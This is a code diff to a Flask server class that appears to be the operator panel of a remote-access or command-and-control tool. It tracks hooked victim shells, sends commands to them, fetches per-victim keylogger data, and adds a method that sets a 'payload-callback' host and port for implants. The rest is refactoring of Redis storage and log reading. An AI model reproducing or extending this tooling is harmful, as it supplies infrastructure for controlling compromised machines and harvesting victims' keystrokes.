@@ -56,13 +56,6 @@ class FlaskFactory(Flask):
             return self.session['username']
         return 'unknown'
 
-    def get_users(self):
-        for user in self.redis.scan_data('*:active_users'):
-            user = user.split(':')[0]
-            if user not in self.active_users:
-                self.active_users.append(user)
-        return self.active_users
-
     def set_user(self):
         self.session['authenticated'] = True
         self.session['uid'] = Utils.guid()
@@ -77,7 +70,6 @@ class FlaskFactory(Flask):
                 return False
             if self.request.form['password'].strip() == self.internal_config.get('server-password'):
                 self.set_user()
-                self.get_users()
                 return True
             return False
         except:
@@ -106,11 +98,13 @@ class FlaskFactory(Flask):
     def get_msgs(self):
         return self.msgs
 
-    def hook_shell(self, uid, id):
-        return self.sql.add_active_user(uid, id)
+    def hook_shell(self, id):
+        uid = self.session['uid']
+        return self.redis.add_active_user(uid, id)
 
-    def unhook_shell(self, uid, id):
-        return self.sql.delete_active_user(uid, id)
+    def unhook_shell(self, id):
+        uid = self.session['uid']
+        return self.redis.remove_active_user(uid, id)
 
     def send_cmd(self, id, cmd, username,):
         cmd_guid = Utils.guid()
@@ -129,10 +123,10 @@ class FlaskFactory(Flask):
         return ''.join(html_escape_table.get(c, c) for c in data)
 
     def get_output(self, id):
-        return self.sync.get_cmd_output(id, self.session['uid'])
+        return self.sync.get_cmd_output(self.session['uid'], id)
 
     def get_input(self, id):
-        return self.sync.get_cmd_send(self.session['uid'])
+        return self.sync.get_cmd_send(self.session['uid'], id)
 
     def get_ip(self):
         host = self.internal_config.get('http-host')
@@ -145,30 +139,38 @@ class FlaskFactory(Flask):
     def get_log_date(self, name):
         dates = fnmatch.filter(os.listdir(os.getcwd() + '/logs/'), '*-*-*')
         log_dates = []
-        logs = ["event", "http", "error", "chat"]
+        logs = ['event', 'http', 'error', 'chat']
         for date in dates:
             if name in logs:
-                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), "%s.log" % name)
+                file_name = fnmatch.filter(os.listdir('%s/logs/%s' % (os.getcwd(), date)), '%s.log' % name)
                 if file_name:
                     if date not in log_dates:
                         log_dates.append(date)
-                        
+
         return sorted(log_dates, key=lambda d: map(int, d.split('-')))
 
     def get_log_data(self, date, name):
-        logs = ["event", "http", "error", "chat", "dashboard"]
-        
+        logs = ['event', 'http', 'error', 'chat']
+
         if name in logs:
             try:
                 path = '%s/logs/%s/%s.log' % (os.getcwd(), date, name)
-                return open(path, 'r').read() 
+                return open(path, 'r').read()
             except:
                 return 'No recent activity.'
+
+        if name == 'dashboard':
+            try:
+                path = '%s/logs/%s/event.log' % (os.getcwd(), date)
+                return open(path, 'r').read()
+            except:
+                return 'No recent activity'
+
 
     def get_shells(self):
         try:
             shells_list = []
-            shells = self.redis.scan_data('*:active:*')
+            shells = self.redis.get_all_shells()
             for shell in shells:
                 shell_info = {
                     'shell_ip': shell.split(':')[2],
@@ -203,21 +205,35 @@ class FlaskFactory(Flask):
         else:
             return 'http://'
 
-    def get_keylogger_data(self, id):
-        return self.redis.get_data('%s:keylogger' % id)
+    def get_keylogger(self, id):
+        return self.redis.get_keylogger_data(id)
 
-    def get_shell_data(self, id):
-        return self.redis.get_data('%s:shell-data' % id)
+    def get_shell(self, id):
+        return self.redis.get_shell_data(id)
 
     def get_session_uid(self):
         return self.session['uid']
 
     def delete_shell(self, id, username):
-        shells = self.redis.scan_data('*:active:*')
+        shells = self.redis.get_all_shells()
         self.send_cmd(id, 'exit', username)
         for shell in shells:
             if id in shell:
                 self.redis.delete_entry(shell)
+
+    def set_payload(self, url):
+        if url == "":
+            return
+        try:
+            host = url.split(":")[0]
+            port = url.split(":")[1]
+            info = "%s:%s" % (host, port)
+            self.internal_config.set('payload-callback', info)
+        except:
+            host = url
+            port = self.internal_config.get('http-port')
+            info = "%s:%s" % (host, port)
+            self.internal_config.set('payload-callback', info)
 
 
 class ServerApi:
